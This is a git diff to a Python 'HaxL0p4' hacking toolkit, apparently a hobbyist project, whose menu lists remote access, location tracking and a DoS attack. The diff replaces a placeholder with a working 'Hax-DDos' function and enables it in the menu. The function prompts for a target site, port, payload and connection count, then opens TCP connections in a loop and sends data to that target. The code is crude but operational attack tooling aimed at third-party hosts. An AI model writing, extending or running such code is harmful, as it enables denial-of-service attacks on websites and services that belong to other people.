@@ -16,6 +16,8 @@ from optparse import OptionParser
 import time, sys, socket, threading, logging, urllib.request, random
 import subprocess
 import time
+import sys
+import string
 
 
 
@@ -65,7 +67,7 @@ opzioni_menu = f"""
  ║ [1] Remote Access                ║ 
  ║ [2] Network                      ║
  ║ [3] Track Location               ║
- ║ [4] Dos Attack                   ║
+ ║ [4] Hax-DDos Attack              ║
  ║ [5] IP Geolocation               ║
  ║                                  ║
  ║ [{Fore.CYAN}6{Style.RESET_ALL}] Update                       ║
@@ -100,16 +102,47 @@ def animazione_lettere(testo, ms):
 
 # ========================== #
 
-def ddos():
-    os.system("clear && figlet L0p4 DDos")
-    print(f"{Fore.RED}\nProssimamente{Style.RESET_ALL}")
-    while True:
-        back = input("\nBack? Y/N: ")
 
-        if back.lower() == "y":
-            return
+def ddos():
+    os.system("clear && figlet Hax-DDos")
+        
+    curdir = os.getcwd()
+
+    animazione_lettere(f"{Fore.RED}[💻] Script made by L0P4 on github{Style.RESET_ALL}\n", 0.03)
+
+    host = input(f"\nSite you want to DDoS {Fore.CYAN}> {Style.RESET_ALL}")
+    port = int(input(f"Port you want to attack {Fore.CYAN}> {Style.RESET_ALL}"))
+    message = input(f"Input the message you want to send {Fore.CYAN}> {Style.RESET_ALL}")
+    conn = int(input(f"\nHow many connections you want to make {Fore.CYAN}> {Style.RESET_ALL}"))
+    ip = socket.gethostbyname(host)
+
+    print()
+    print("+--------------------------------+")
+
+    def dos():
+        ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            ddos.connect((host, 80))
+            ddos.send(message.encode())
+            ddos.sendto(message.encode(), (ip, port))
+            ddos.send(message.encode())
+        except socket.error as msg:
+            print("|[Connection Failed]         |")
+        print("|[Hax-DDoS Attack Engaged]       |")
+        ddos.close()
+
+    for i in range(1, conn):
+        dos()
+
+    print("+--------------------------------+")
+    print("The connections you requested had finished")
+
+    if __name__ == "__main__":
+        answer = input(f"\n{Fore.LIGHTRED_EX}[​❔​] Do you want to ddos more? Y/N: {Style.RESET_ALL}")
+        if answer.strip() in "y Y yes Yes YES".split():
+            ddos()
         else:
-            break
+            menu()
 
 # ========================== #
 
@@ -280,13 +313,6 @@ def arp_scan():
 
 
 
-def website_scanner():
-    os.system("clear && figlet HaxL0p4")
-
-    pass
-
-
-
 
 def ip_scanner():
     os.system("clear && figlet HaxL0p4")
@@ -392,16 +418,14 @@ def ip_lookup():
             animazione_lettere(opzione_non_valida, 0.03)
 
 
-
-
 def scanner():
     os.system("clear && figlet HaxL0p4")
     
     netScan_options = f"""
  ╔═════════════════════════════════════╗
  ║ [1] IP Scanner                      ║ 
- ║ [2] soon                            ║
- ║ [3] Website Lookup                  ║
+ ║ [2] Website Lookup                  ║
+ ║ [3] Coming Soon...                  ║
  ╚═════════════════════════════════════╝
 
  ╔═════════════════════════════════════╗
@@ -415,11 +439,11 @@ def scanner():
     while True:
         if s == "1":
             ip_scanner()
-        elif s == "2":
+        elif s == "3":
             #website_scanner()
             animazione_lettere("\n"+opzione_non_valida, 0.03)
             scanner()
-        elif s == "3":
+        elif s == "2":
             ip_lookup()
         elif s == "0":
             return network()
@@ -539,7 +563,7 @@ def menu():
     try:
         while True:
             os.system("clear && figlet HaxL0p4")
-            prossimamente = f" \n{Fore.RED} Ancora non disponibile...{Style.RESET_ALL}"
+            prossimamente = f" \n{Fore.RED} [!] Coming Soon...{Style.RESET_ALL}"
 
             print(opzioni_menu)
 
@@ -555,9 +579,9 @@ def menu():
                 #track_location()
             elif s == "4":
                 while True:
-                    animazione_lettere(prossimamente, 0.03)
-                    return menu()
-                    #ddos()
+                    #animazione_lettere(prossimamente, 0.03)
+                    #return menu()
+                    ddos()
             elif s == "5":
                 ipGeolocation()
             elif s == "6":
